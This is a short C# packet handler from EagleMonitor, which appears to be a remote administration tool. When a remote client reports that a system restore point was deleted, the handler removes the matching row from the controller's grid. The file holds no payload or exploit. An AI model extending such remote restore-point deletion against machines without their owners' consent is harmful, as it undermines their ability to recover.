using EagleMonitor.Networking;
using PacketLib.Packet;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class DeleteRestorePointPacketHandler
    {
        public DeleteRestorePointPacketHandler(DeleteRestorePointPacket deleteRestorePointPacket, ClientHandler clientHandler)
        {
            try
            {
                if (clientHandler.restorePointForm.dataGridView1 != null && deleteRestorePointPacket.deleted == true)
                {
                    clientHandler.restorePointForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
                    {
                        foreach (DataGridViewRow row in clientHandler.restorePointForm.dataGridView1.Rows)
                        {
                            if (int.Parse(row.Cells[0].Value.ToString()) == deleteRestorePointPacket.index)
                            {
                                clientHandler.restorePointForm.dataGridView1.Rows.Remove(row);
                                break;
                            }
                        }
                    }));
                }
            }
            catch { }
            return;
        }
    }
}
